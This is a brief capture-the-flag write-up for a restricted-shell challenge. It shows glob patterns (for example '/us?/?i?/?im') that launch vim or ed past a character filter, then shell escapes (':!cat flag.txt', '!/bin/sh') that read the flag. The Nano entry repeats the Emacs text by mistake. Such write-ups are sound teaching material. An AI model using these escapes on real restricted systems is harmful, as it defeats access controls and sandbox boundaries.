# Overview
- Restrictions: 
	- Only can use characters that end with a '1'. 
- What does this do: 
	- No wildcard (' * ') and no space!
	- So, we cannot provide a parameter to these functions haha
	- '.' is not allowed
- What do we have? 
	- / (allows for directory traversal!) 
	- a,c,e,....
	- ? (single character wildcard) 
- Because we cannot use spaces (and wildcards don't work for spaces), we will need to call stand-alone programs for this. Most of them end up being text editors. 

# Solutions

## Vim 
- ``/us?/?i?/?im``
- This opens up the 'vim' text editor.
- Then, run bash command from inside of here
	:!cat flag.txt
	SC3{even_Is_not_odd!gotta_love_the_*}

## Ed 
- ``/?i?/e?``
- Then, run a bash command from inside of here
	- !/bin/sh

## Emacs
- ``emacs``
- emacs is another text editor (happens to only have good characters!) 

## Nano
- ``/bin/n?no``
- emacs is another text editor (happens to only have good characters!) 